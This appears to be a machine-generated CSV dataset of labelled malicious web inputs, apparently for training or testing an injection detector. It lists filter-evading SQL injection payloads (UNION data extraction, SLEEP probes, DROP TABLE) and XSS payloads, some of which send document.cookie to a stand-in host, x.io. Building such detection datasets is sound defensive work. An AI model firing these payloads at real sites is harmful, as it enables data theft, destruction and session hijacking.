text,label,attack_type,generator
%2522%252F%252A%252A%252FOR%252F%252A%252A%252F1%25250aBETWEEN%25250a0%25250aAND%25250a9%252F%252A%252A%252F--,1,sqli,codellama
']+AnD+2>1+--,1,sqli,codellama
`/**/AnD/**/''=''/**/-- -,1,sqli,codellama
"""/**/Or/**/1=2/**/%23",1,sqli,codellama
`/**/AnD/**/1%0AbEtWeEn%0A0%0AaNd%0A9/**/--%0A,1,sqli,codellama
%2522%2509OR%25091%253D2%2509--%2520-,1,sqli,codellama
']+Or+1=1+-- ,1,sqli,codellama
%2560%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252a%2529%2520FrOm%2520aCcOuNtS%2529%253E0%252523,1,sqli,codellama
%2527%255D%25250aA/**/N/**/D%25250a%2527a%2527%253D%2527a%2527%25250a--,1,sqli,codellama
`+oR+1=2+--,1,sqli,codellama
%2527%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--%2520-,1,sqli,codellama
%2527%2520OR%25201%253D1%2520LIMIT%25201--%2520-,1,sqli,codellama
%2527%255D%25250d%25250AoR%25250d%25250A2%253E1%25250D%25250a--%2520-,1,sqli,codellama
%2522%2529%25250aO%252F%252A%252A%252FR%25250a2%253E1%25250a--,1,sqli,codellama
']%0d%0Ao/**/R%0d%0A1=2%0D%0a/*X*/,1,sqli,codellama
""") A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M tokens)>0#",1,sqli,codellama
%2527%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%252523,1,sqli,codellama
""")	A/**/N/**/D	0<1	/*x*/",1,sqli,codellama
%2527%2529%252509AND%2525090%253C1%252509%252F%252Ax%252A%252F,1,sqli,codellama
'); dRoP TaBlE AdMiN#,1,sqli,codellama
"""/**/A/**/n/**/D/**/''=''/**//*X*/",1,sqli,codellama
"'%0aUNION%0aSELECT%0aNULL,NULL--%0a-",1,sqli,codellama
""")%0aOr%0A0<1%0A-- -",1,sqli,codellama
""") Or 1=1 lImIt 1#",1,sqli,codellama
%2560%252509O%252F%252A%252A%252FR%252509%2527a%2527%253D%2527a%2527%252509%2523,1,sqli,codellama
%2527%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520customers%2529%253E0--%2520,1,sqli,codellama
""")%09UNION%09SELECT%09name,pwd,role,last_name,status%09FROM%09users--%09-",1,sqli,codellama
"'] U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t nUlL,NuLl,nUlL,NuLl-- -",1,sqli,codellama
')%0d%0AaNd%0D%0a0<1%0d%0A-- -,1,sqli,codellama
%2527%2509OR%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
%2522%252BAND%252B%2527a%2527%253D%2527a%2527%252B--%2520-,1,sqli,codellama
'%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0aaccounts)>0/*x*/,1,sqli,codellama
'/**/Or/**/0<1/**/-- ,1,sqli,codellama
']%09Or%091=1%09-- -,1,sqli,codellama
%2522%252BA%252F%252A%252A%252FN%252F%252A%252A%252FD%252B1%253D1%252B%252523,1,sqli,codellama
']	Or	1 bEtWeEn 0 aNd 9	/*x*/,1,sqli,codellama
%2560%2520AND%2520extractvalue%25281%252Cconcat%25280x7e%252C%2528SELECT%2520role%2520FROM%2520users%2520LIMIT%25201%2529%2529%2529,1,sqli,codellama
""" A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M sessions)>0--",1,sqli,codellama
%2560%253B%2520S/**/E/**/L/**/E/**/C/**/T%2520S/**/L/**/E/**/E/**/P%25285%2529%252523,1,sqli,codellama
'%09OR%091=1%09--/**/-,1,sqli,codellama
""")+AnD+0<1+#",1,sqli,codellama
%2560%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D1%252F%252A%252A%252F--,1,sqli,codellama
"""/**/AnD/**/1/**/BeTwEeN/**/0/**/AnD/**/9/**/--",1,sqli,codellama
` aNd 1 bEtWeEn 0 aNd 9 #,1,sqli,codellama
%2560%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520aDmIn%2529%253E0--%2520-,1,sqli,codellama
%2527%2509oR%25091%253d2%2509%252523,1,sqli,codellama
%2522%2529%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--,1,sqli,codellama
%2522%252509OR%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
""");%0aS/**/E/**/L/**/E/**/C/**/T%0aS/**/L/**/E/**/E/**/P(5)#",1,sqli,codellama
%2527%255D%252BAND%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,codellama
""") O/**/r (S/**/e/**/L/**/e/**/C/**/t pWd f/**/R/**/o/**/M AcCoUnTs wHeRe pWd=681)=555",1,sqli,codellama
`%0aA/**/N/**/D%0a0<1%0a--%0a,1,sqli,codellama
""";%0aSELECT%0aSLEEP(5)/*x*/",1,sqli,codellama
%2522%25250d%25250aO/**/R%25250d%25250a0%253C1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2522%2529%25250aOR%25250a1%253D2%25250a--%252B,1,sqli,codellama
']/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/--,1,sqli,codellama
'	A/**/N/**/D	''=''	%23,1,sqli,codellama
'); dRoP TaBlE StAfF-- ,1,sqli,codellama
%2560%2520AND%25200%253C1%2520%2523,1,sqli,codellama
']; dRoP TaBlE AdMiN%23,1,sqli,codellama
%2522%2529%25250d%25250aAND%25250d%25250a1%253D1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2527%2529%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--%2520-,1,sqli,codellama
%2527%255D%25250d%25250AoR%25250d%25250A0%253C1%25250D%25250a--,1,sqli,codellama
%2527%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL--,1,sqli,codellama
%2560%252509AND%2525091%252509LIKE%2525091%252509%252523,1,sqli,codellama
%2527%252509oR%252509%2527%2527%253D%2527%2527%252509--%2520-,1,sqli,codellama
'+O/**/R+1=1+LIMIT+1--+,1,sqli,codellama
%2522%2529%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F0%253C1%252F%252A%252A%252F--%2520,1,sqli,codellama
%2527%2529%2509Or%25091%2520bEtWeEn%25200%2520aNd%25209%2509%252523,1,sqli,codellama
"""	O/**/R	1 BETWEEN 0 A/**/N/**/D 9	/*x*/",1,sqli,codellama
%2527%2529%25250d%25250AaNd%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A--,1,sqli,codellama
""")%0aAnD%0a1=2%0a--",1,sqli,codellama
"` u/**/N/**/i/**/O/**/n s/**/E/**/l/**/E/**/c/**/T NuLl,nUlL,NuLl,nUlL,NuLl,nUlL#",1,sqli,codellama
']	Or	1=1	#,1,sqli,codellama
']+A/**/N/**/D+1%0aLIKE%0a1+/*x*/,1,sqli,codellama
""")/**/A/**/N/**/D/**/(S/**/E/**/L/**/E/**/C/**/T/**/COUNT(*)/**/F/**/R/**/O/**/M/**/staff)>0%23",1,sqli,codellama
']	AnD	0<1	/*X*/,1,sqli,codellama
'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/members)>0--/**/-,1,sqli,codellama
`; SeLeCt sLeEp(5)#,1,sqli,codellama
'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M admin)>0/*x*/,1,sqli,codellama
%2527%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520aDmIn%2529%253E0%2523,1,sqli,codellama
';+D/**/R/**/O/**/P+TABLE+sessions%23,1,sqli,codellama
"""); d/**/R/**/o/**/P TaBlE SeSsIoNs%23",1,sqli,codellama
""")/**/AND/**/1=1/**//*x*/",1,sqli,codellama
'	aNd	1 lIkE 1	%23,1,sqli,codellama
""";%09SELECT%09SLEEP(5)--%09",1,sqli,codellama
']%0aAnD%0a(sElEcT%0aCoUnT(*)%0afRoM%0aOrDeRs)>0#,1,sqli,codellama
']%0aOR%0a2>1%0a--%09-,1,sqli,codellama
"""); S/**/E/**/L/**/E/**/C/**/T S/**/L/**/E/**/E/**/P(5)-- ",1,sqli,codellama
""")	A/**/n/**/D	0<1	-- -",1,sqli,codellama
%2527%255D%25250d%25250aOR%25250d%25250a1%253D2%25250d%25250a--%2520,1,sqli,codellama
%2527%25250aAND%25250a1%253D2%25250a--%2520,1,sqli,codellama
%2527%2529%2520OR%2520%2528SELECT%2520token%2520FROM%2520admin%2520WHERE%2520token%253D860%2529%253D934,1,sqli,codellama
%2522%2529%252509AND%2525091%2520BETWEEN%25200%2520AND%25209%252509%2523,1,sqli,codellama
']/**/aNd/**/''=''/**/-- ,1,sqli,codellama
'	A/**/N/**/D	'a'='a'	#,1,sqli,codellama
%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%252523,1,sqli,codellama
%2560%253B%252BDROP%252BTABLE%252Busers--%252B,1,sqli,codellama
%2527%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--%2520-,1,sqli,codellama
']; sElEcT SlEeP(5)--,1,sqli,codellama
`/**/O/**/R/**/1=1/**/LIMIT/**/1--/**/-,1,sqli,codellama
`%09oR%091=1%09%23,1,sqli,codellama
')%09Or%092>1%09-- -,1,sqli,codellama
']%09Or%091=1%09#,1,sqli,codellama
%2527%2529%2520UnIoN%2520SeLeCt%2520nUlL%252CNuLl%252CnUlL%252F%252Ax%252A%252F,1,sqli,codellama
')%0aO/**/R%0a1=2%0a#,1,sqli,codellama
`/**/AnD/**/1=1/**/--,1,sqli,codellama
']+AND+''=''+--,1,sqli,codellama
%2522%253B%2520D%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FP%2520TABLE%2520o%252F%252A%252A%252Frders%2523,1,sqli,codellama
%2522%2529%252509O/**/R%2525091%253D2%252509--,1,sqli,codellama
""") A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M customers)>0-- -",1,sqli,codellama
%2522%2529%25250aAND%25250a0%253C1%25250a%252F%252Ax%252A%252F,1,sqli,codellama
'%0aO/**/R%0a1 BETWEEN 0 A/**/N/**/D 9%0a-- ,1,sqli,codellama
%2527%25250d%25250aA/**/N/**/D%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520-,1,sqli,codellama
%2560%252BOR%252B1%253D2%252B--%2520,1,sqli,codellama
')%0aOr%0A2>1%0A%23,1,sqli,codellama
']/**/A/**/N/**/D/**/0<1/**/--,1,sqli,codellama
""")%0d%0aO/**/R%0d%0a1=1%0d%0a%23",1,sqli,codellama
')+AnD+'a'='a'+#,1,sqli,codellama
"` uNiOn sElEcT UiD,StAtUs,tOkEn fRoM UsErS-- ",1,sqli,codellama
%2522%25250d%25250aAND%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520,1,sqli,codellama
""" o/**/R (s/**/E/**/l/**/E/**/c/**/T NaMe f/**/R/**/o/**/M SeSsIoNs wHeRe nAmE=530)=320",1,sqli,codellama
%2527%253B%2520SELECT%2520SLEEP%25285%2529--%2520-,1,sqli,codellama
')%09O/**/R%090<1%09%23,1,sqli,codellama
"""%09o/**/R%090<1%09#",1,sqli,codellama
%2522%2520OR%25201%253D1%2520LIMIT%25201%2523,1,sqli,codellama
""")%09O/**/R%090<1%09#",1,sqli,codellama
'];%0aD/**/R/**/O/**/P%0aTABLE%0aadmin--,1,sqli,codellama
%2560%252BOR%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,codellama
%2527%2529%252509AND%2525091%253D1%252509--%252F%252A%252A%252F-,1,sqli,codellama
'%0aA/**/N/**/D%0a'a'='a'%0a/*x*/,1,sqli,codellama
'];%09sElEcT%09SlEeP(5)%23,1,sqli,codellama
"""%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0aaccounts)>0#",1,sqli,codellama
'%0D%0aOr%0D%0a0<1%0d%0A%23,1,sqli,codellama
"""/**/A/**/N/**/D/**/1=1/**/#",1,sqli,codellama
'%09oR%09''=''%09--,1,sqli,codellama
%2522%2529%253b%2520dRoP%2520TaBlE%2520CuStOmErS%2523,1,sqli,codellama
"""+A/**/N/**/D+1 LIKE 1+--",1,sqli,codellama
'); s/**/E/**/l/**/E/**/c/**/T S/**/l/**/E/**/e/**/P(5)-- ,1,sqli,codellama
""")%09O/**/R%090<1%09-- -",1,sqli,codellama
"""%09OR%091%0aLIKE%0a1%09--%0a",1,sqli,codellama
%2527%2529%252BUNION%252BSELECT%252BNULL%252CNULL%252CNULL%252CNULL%252CNULL--,1,sqli,codellama
`; D/**/R/**/O/**/P TABLE users-- -,1,sqli,codellama
']%0d%0AaNd%0D%0a''=''%0d%0A/*x*/,1,sqli,codellama
""") AnD (sElEcT CoUnT(*) fRoM AcCoUnTs)>0-- -",1,sqli,codellama
%2522%2520oR%25201%253d1%2520%252523,1,sqli,codellama
"""	O/**/R	''=''	%23",1,sqli,codellama
%2527%255D%2520O%252F%252A%252A%252FR%25200%253C1%2520%252523,1,sqli,codellama
') A/**/n/**/D (s/**/E/**/l/**/E/**/c/**/T CoUnT(*) f/**/R/**/o/**/M AcCoUnTs)>0-- ,1,sqli,codellama
']%0aA/**/N/**/D%0a1=2%0a/*x*/,1,sqli,codellama
%2527%252509OR%252509%2527a%2527%253D%2527a%2527%252509%252523,1,sqli,codellama
%2522%2529%252509AND%2525090%253C1%252509%252F%252Ax%252A%252F,1,sqli,codellama
""";%0aSeLeCt%0AsLeEp(5)#",1,sqli,codellama
%2560%25250aOR%25250a1%2520BETWEEN%25200%2520AND%25209%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2527%2529%252509AND%2525091%253D2%252509--%2520-,1,sqli,codellama
')+O/**/r+0<1+%23,1,sqli,codellama
%2527%2529%2520O%252F%252A%252A%252FR%25201%253D1%2520LIMIT%25201%252F%252Ax%252A%252F,1,sqli,codellama
%2522%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520credentials%2529%253E0%252523,1,sqli,codellama
%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520-,1,sqli,codellama
%2522%253B%2520DrOp%2520tAbLe%2520uSeRs--%2520-,1,sqli,codellama
` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M tokens)>0--,1,sqli,codellama
`/**/Or/**/0<1/**/--+-,1,sqli,codellama
""")%0aA/**/N/**/D%0a1=1%0a-- ",1,sqli,codellama
"') UnIoN SeLeCt eMaIl,uId,lAsT_NaMe,iD,NaMe fRoM SeSsIoNs%23",1,sqli,codellama
%2522%2529%25250aOR%25250a0%253C1%25250a%252523,1,sqli,codellama
%2527%255D%25250d%25250AaNd%25250D%25250a2%253e1%25250d%25250A%252f%252Ax%252A%252f,1,sqli,codellama
%2560%25250d%25250aO/**/R%25250d%25250a0%253C1%25250d%25250a--,1,sqli,codellama
']+AnD+1+LiKe+1+/*x*/,1,sqli,codellama
`%0D%0aAnD%0d%0A0<1%0D%0a/*X*/,1,sqli,codellama
'/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/#,1,sqli,codellama
`%0d%0aOR%0d%0a1%09LIKE%091%0d%0a/*x*/,1,sqli,codellama
'+A/**/N/**/D+1=1+--+-,1,sqli,codellama
%2527%255D%25250d%25250aO%252F%252A%252A%252FR%25250d%25250a0%253C1%25250d%25250a--%2520-,1,sqli,codellama
']%0aO/**/r%0A2>1%0A-- ,1,sqli,codellama
')%0d%0aO/**/R%0d%0a0<1%0d%0a--,1,sqli,codellama
""")%0d%0AaNd%0D%0a'a'='a'%0d%0A#",1,sqli,codellama
%2522%253B%2520SeLeCt%2520sLeEp%25285%2529%252523,1,sqli,codellama
']+O/**/r+1=1+#,1,sqli,codellama
""") O/**/r 1 lIkE 1 --",1,sqli,codellama
%2560%252BAND%252B0%253C1%252B%2523,1,sqli,codellama
"""	O/**/R	1 BETWEEN 0 A/**/N/**/D 9	--",1,sqli,codellama
%2527%25250d%25250aAND%25250d%25250a2%253E1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2527%2529%253B%2520SELECT%2520SLEEP%25285%2529--%2520-,1,sqli,codellama
%2527%2529%252BAND%252B1%252BLIKE%252B1%252B--%252B,1,sqli,codellama
`%0aO/**/R%0a''=''%0a#,1,sqli,codellama
%2522%2529%253b%2520dRoP%2520TaBlE%2520UsErS--,1,sqli,codellama
']%09OR%091=1%09LIMIT%091--,1,sqli,codellama
']%0aO/**/R%0a1=1%0a#,1,sqli,codellama
` o/**/R 1=1 LiMiT 1-- ,1,sqli,codellama
%2522%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520token%252Cuser%2520F/**/R/**/O/**/M%2520staff%252F%252Ax%252A%252F,1,sqli,codellama
`	AND	1=2	--+-,1,sqli,codellama
'; S/**/E/**/L/**/E/**/C/**/T S/**/L/**/E/**/E/**/P(5)-- ,1,sqli,codellama
%2527%255D%2509OR%25091%2520LIKE%25201%2509--%2520-,1,sqli,codellama
%2527%25250aO/**/R%25250a%2527a%2527%253D%2527a%2527%25250a%252F%252Ax%252A%252F,1,sqli,codellama
"""%09AND%090<1%09--%0a-",1,sqli,codellama
%2560%25250d%25250aOR%25250d%25250a%2527a%2527%253D%2527a%2527%25250d%25250a--%2520-,1,sqli,codellama
%2527%2529%25250d%25250aA/**/N/**/D%25250d%25250a1%2520BETWEEN%25200%2520A/**/N/**/D%25209%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
`+a/**/N/**/d+'A'='A'+-- -,1,sqli,codellama
%2527%255D%2520OR%25201%253D2%2520--%2520,1,sqli,codellama
%2522%253B%2520DROP%2520TABLE%2520staff--,1,sqli,codellama
%2522%2526gt%253B%2526lt%253Biframe%2520oninput%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,codellama
%2522%253E%253Csvg%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
"&lt;iframe src=""javascript:confirm(1)""&gt;",1,xss,codellama
%253Cscript%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253CDiV%2520OnErRoR%253DFeTcH%2528%2527%252F%252Fx.iO%252F%2527%252BDoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
"<BoDy oNfOcUs=""AlErT(1)"">",1,xss,codellama
%2527%253E%253Cinput%2520onfocus%253Dalert%25281%2529%253E,1,xss,codellama
%2527%253E%253Ciframe%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
<ScRiPt oNlOaD=PrInT()>,1,xss,codellama
<MaRqUeE OnStArT=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
%253Cbody%2520onpointerover%253Dalert%25281%2529%253E,1,xss,codellama
%2522%253E%253Cimg%2520ontoggle%253Dprint%2528%2529%253E,1,xss,codellama
%253Caudio%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
'><ImG OnInPuT=PrInT()>,1,xss,codellama
%2527%253E%253Caudio%2520onclick%253Dconfirm%25281%2529%253E,1,xss,codellama
%2522%253E%253Cscript%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%2522%253E%253Cvideo%2520oninput%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
'><DeTaIlS OnClIcK=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,codellama
"""><ScRiPt oNiNpUt=lOcAtIoN='//x.iO'>",1,xss,codellama
"""><DeTaIlS OnPoInTeRoVeR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
<MaRqUeE OnToGgLe=eVaL(AtOb('YwXlCnQoMsK'))>,1,xss,codellama
%2527%253E%253Cobject%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
<ViDeO OnLoAd=cOnFiRm(1)>,1,xss,codellama
%2522%253E%253Cscript%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
"<BoDy oNaNiMaTiOnStArT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
'&gt;&lt;details ontoggle=alert(document.domain)&gt;,1,xss,codellama
%253Cvideo%2520ontoggle%253Dalert%25281%2529%253E,1,xss,codellama
%253Ca%2520onpointerover%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
'&gt;&lt;div onpointerover=location='//x.io'&gt;,1,xss,codellama
%253Cbody%2520oninput%253D%2522print%2528%2529%2522%253E,1,xss,codellama
%253Cvideo%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
&lt;div onmouseover=alert(1)&gt;,1,xss,codellama
"<DiV OnFoCuS=""eVaL(AtOb('YwXlCnQoMsK'))"">",1,xss,codellama
'><SvG OnClIcK=AlErT(1)>,1,xss,codellama
"""&gt;&lt;body onload=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
%2527%253E%253cScRiPt%2520oNiNpUt%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,codellama
"<BoDy oNtOgGlE=""cOnFiRm(1)"">",1,xss,codellama
"<MaRqUeE OnFoCuS=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
%2522%253E%253Cdiv%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%2522%253E%253CImG%2520OnToGgLe%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253E,1,xss,codellama
"&lt;marquee onload=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,codellama
"""&gt;&lt;audio onpointerover=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
%2527%253E%253Cdetails%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
%253Cdetails%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,codellama
%2527%253E%253Cimg%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
"""><ObJeCt oNpOiNtErOvEr=lOcAtIoN='//x.iO'>",1,xss,codellama
%2527%253E%253Cimg%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
%2522%253E%253Cvideo%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
%253Cvideo%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,codellama
%253Caudio%2520ontoggle%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
%2522%253E%253Cinput%2520onfocus%253Dprint%2528%2529%253E,1,xss,codellama
"<MaRqUeE OnAnImAtIoNsTaRt=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,codellama
%253Caudio%2520onclick%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
"<sCrIpT onerror=""fetch('//x.io/'+document.cookie)"">",1,xss,codellama
"""&gt;&lt;video onpointerover=alert(document.cookie)&gt;",1,xss,codellama
'><SvG OnAnImAtIoNsTaRt=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
'&gt;&lt;iframe onerror=alert(document.domain)&gt;,1,xss,codellama
%253Ca%2520onerror%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
%253cImG%2520OnAnImAtIoNsTaRt%253DpRiNt%2528%2529%253E,1,xss,codellama
'&gt;&lt;details onclick=print()&gt;,1,xss,codellama
<IfRaMe oNlOaD=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
%253Cvideo%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
"""><DeTaIlS OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>",1,xss,codellama
%253Cbody%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
%253Cimg%2520onclick%253Dalert%2528document.domain%2529%253E,1,xss,codellama
"""><AuDiO OnFoCuS=AlErT(1)>",1,xss,codellama
%253CIfRaMe%2520oNiNpUt%253D%2522PrInT%2528%2529%2522%253E,1,xss,codellama
%253Ciframe%2520onanimationstart%253Dprint%2528%2529%253E,1,xss,codellama
&lt;object ontoggle=print()&gt;,1,xss,codellama
%2527%253E%253Csvg%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
%253CScRiPt%2520onclick%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%253Cvideo%2520onanimationstart%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%2527%253E%253Csvg%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
%253Cinput%2520onclick%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%2522%253E%253CA%2520OnStArT%253DAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
&lt;svg onload=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
<ScRiPt oNcLiCk=cOnFiRm(1)>,1,xss,codellama
%2527%253E%253CDeTaIlS%2520OnMoUsEoVeR%253DAlErT%25281%2529%253E,1,xss,codellama
%253Cdiv%2520onstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
%2522%253E%253Cdiv%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
'&gt;&lt;details onclick=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,codellama
%2522%253E%253Cinput%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
%253Ca%2520href%253D%2522javascript%253Aalert%2528document.domain%2529%2522%253Ex%253C%252Fa%253E,1,xss,codellama
"<sCrIpT onload=""confirm(1)"">",1,xss,codellama
"<InPuT OnMoUsEoVeR=""cOnFiRm(1)"">",1,xss,codellama
%253Cscript%2520onclick%253D%2522alert%25281%2529%2522%253E,1,xss,codellama
&lt;ImG OnClIcK=AlErT(DoCuMeNt.cOoKiE)&gt;,1,xss,codellama
%253Cdiv%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
%253Cscript%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
%253cDiV%2520OnMoUsEoVeR%253dAlErT%2528DoCuMeNt.cOoKiE%2529%253E,1,xss,codellama
%253Cmarquee%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
'><ScRiPt oninput=eval(atob('YWxlcnQoMSk'))>,1,xss,codellama
%253Cinput%2520onclick%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
<BoDy oNtOgGlE=CoNfIrM(1)>,1,xss,codellama
%253Cmarquee%2520onload%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
&lt;input onstart=confirm(1)&gt;,1,xss,codellama
